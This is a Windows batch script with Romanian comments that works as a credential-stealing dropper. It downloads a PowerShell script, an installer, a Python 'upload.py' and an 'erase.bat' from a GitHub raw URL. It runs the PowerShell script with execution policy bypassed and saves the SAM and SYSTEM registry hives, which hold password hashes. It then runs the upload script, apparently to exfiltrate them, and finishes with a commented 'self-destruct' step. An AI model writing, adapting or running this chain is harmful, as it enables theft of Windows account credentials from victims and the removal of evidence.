@echo off
setlocal ENABLEDELAYEDEXPANSION

REM Obține locația scriptului curent
set SCRIPT_DIR=%~dp0

REM Mergi la directorul scriptului
cd /d "%SCRIPT_DIR%"

REM Descarcă fișierele necesare
curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/.env > ".env"
curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/install.bat > "install.bat"
curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/intialize.ps1 > "initialize.ps1"
curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/upload.py > "upload.py"
curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/erase.bat > "erase.bat"

REM Verifică dacă initialize.ps1 a fost descărcat corect
findstr /i "404" initialize.ps1 >nul
if %errorlevel%==0 (
    echo [!] Eroare: initialize.ps1 nu a fost găsit sau GitHub a returnat 404.
    pause
    exit /b
)

REM Rulează scriptul PowerShell
powershell -ExecutionPolicy Bypass -File initialize.ps1

REM Instalează dependențele
call install.bat

REM Salvează registry (necesită privilegii de admin)
powershell -Command "reg save HKLM\sam .\sam.save"
powershell -Command "reg save HKLM\system .\system.save"

REM Rulează scriptul Python
py upload.py

REM Self-destruct operation
call erase.bat

pause